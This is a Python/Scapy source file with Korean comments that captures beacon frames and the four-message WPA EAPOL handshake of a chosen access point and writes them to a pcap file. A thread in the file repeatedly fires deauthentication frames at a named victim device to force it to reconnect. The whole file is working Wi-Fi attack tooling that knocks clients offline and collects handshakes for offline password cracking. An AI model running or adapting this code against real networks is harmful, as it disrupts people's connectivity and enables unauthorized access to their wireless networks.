import time
from scapy.all import wrpcap
from scapy.layers.dot11 import Dot11
from scapy.layers.eap import EAPOL, EAPOL_KEY
from def_atkDeauth import atkDeauth

class collPkt:
    keyInfoList = [b'\x00\x8a', b'\x01\x0a', b'\x13\xca', b'\x03\x0a']
        # EAPOL M1, M2, M3, M4
    collCheck = [False, False, False, False]
    pktList = []
    bssid = ''

    def beaconCapture(self, pkt):
    # BEACON 프레임 수집
        if pkt.haslayer(Dot11):
            dot11Frm = pkt.getlayer(Dot11)
            if (dot11Frm.type == 0) and (dot11Frm.subtype == 8):
                if str(dot11Frm.addr3).upper() == self.bssid:
                    self.pktList.append(pkt)
                    print('Beacon Frame Found. ('+str(pkt.info)+', BSS='+self.bssid+')')
    
    def beaconStop(self, pkt):
    # BEACON 프레임 수집 종료
        if len(self.pktList) > 0:
            return True
        else:
            return False
    
    def eapolCapture(self, pkt):
    # EAPOL 프레임 수집
        if pkt.haslayer(Dot11):
            dot11Frm = pkt.getlayer(Dot11)
            if str(dot11Frm.addr3).upper() == self.bssid:
            # 해당하는 BSSID의 EAPOL 프레임만 수집
                if pkt.haslayer(EAPOL):
                    eapolFrm =  pkt.getlayer(EAPOL)
                    keyInfo = bytes(eapolFrm[0])[5:7]
                    for idx, val in enumerate(self.keyInfoList):
                    # EAPOL Frame의 Key Information을 비교해 리스트에 저장
                        if keyInfo == val:
                            self.collCheck[idx] = True
                            idx += 1
                            print('EAPOL Message '+str(idx)+' Found. ('+str(val)+', BSS='+self.bssid+')')
                            self.pktList.append(pkt)
                            break

    def eapolStop(self, pkt):
    # EAPOL 프레임 수집 종료
        if False not in self.collCheck :
        # EAPOL 1~4 모두 수집이 되면 수집 종료
            wrpcap('./test.pcap', self.pktList)
            return True
        else:
            return False

    def deauthThread(self, vicAddr:str, bssAddr:str):
    # Deauth 프레임 전송
        print('Deauth thread enable.')
        while(True):
            atkDeauth(vicAddr, bssAddr, loopMax=3)
            # 재연결 유도를 위해 Deauth를 3회 전송
            time.sleep(5)
            # 5초 대기
            if False not in self.collCheck :
            # EAPOL 1~4 모두 수집이 되면 수집 종료
                print('Deauth thread disable.')
                return True